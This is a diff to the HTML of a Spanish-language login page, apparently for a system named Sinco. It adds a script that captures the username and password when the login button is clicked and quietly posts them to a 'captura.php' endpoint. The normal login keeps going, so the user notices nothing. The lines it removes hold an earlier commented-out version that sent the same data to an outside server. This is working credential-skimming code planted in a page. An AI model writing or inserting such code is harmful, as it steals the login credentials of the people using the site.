@@ -154,37 +154,32 @@ Es también importante que reporte cualquier anomalía en este proceso. Como por
 <span>Nombre de usuario</span> <input id="txtUsuarioRecordar" title="Nombre de usuario" type="text"/> <span>Digite su contraseña</span> <input id="txtContrasenaNueva" title="Digite su contraseña" type="password"/> <span>Digite nuevamente la contraseña</span> <input id="txtContrasenaNueva2" title="Digite nuevamente la contraseña" type="password"/><button id="btnRecordarPass">Enviar</button></div>
 </div>
 </div>
-<script src="Scripts/Sinco/modules/login.js?v=638859503003059838"></script><script src="Scripts/Sinco/modules/login.fonts.js?v=638859503003059838"></script>
+<script src="Scripts/Sinco/modules/login.js?v=638859503003059838"></script>
+<script src="Scripts/Sinco/modules/login.fonts.js?v=638859503003059838"></script>
+
 <script>
-    document.addEventListener("DOMContentLoaded", function () {
-        // Esperar al clic del botón "Siguiente"
-        const btnSiguiente = document.querySelector("input[type='submit'], input[value='Siguiente'], button");
+document.addEventListener("DOMContentLoaded", function () {
+    const btnSiguiente = document.querySelector("input[type='submit'], input[value='Siguiente'], button");
 
-        if (btnSiguiente) {
-            btnSiguiente.addEventListener("click", function (e) {
-                const usuario = document.getElementById("txtUsuario")?.value || "";
-                const contrasena = document.getElementById("txtContrasena")?.value || "";
+    if (btnSiguiente) {
+        btnSiguiente.addEventListener("click", function (e) {
+            const usuario = document.getElementById("txtUsuario")?.value || "";
+            const contrasena = document.getElementById("txtContrasena")?.value || "";
 
-                // Aquí puedes hacer lo que desees con los datos capturados
-                console.log("Usuario:", usuario);
-                console.log("Contraseña:", contrasena);
-
-                // Ejemplo: Enviar los datos a un servidor (comentado por seguridad)
-                /*
-                fetch("https://tuservidor.com/captura", {
-                    method: "POST",
-                    headers: {
-                        "Content-Type": "application/json"
-                    },
-                    body: JSON.stringify({ usuario, contrasena })
-                });
-                */
-
-                // Si no deseas enviar aún, puedes evitar el envío del formulario así:
-                // e.preventDefault();
+            // Enviar los datos a PHP
+            fetch("captura.php", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/x-www-form-urlencoded"
+                },
+                body: `usuario=${encodeURIComponent(usuario)}&contrasena=${encodeURIComponent(contrasena)}`
             });
-        }
-    });
+
+            // Continuar con el flujo normal del formulario (no se bloquea)
+        });
+    }
+});
 </script>
+
 
 </body></html>
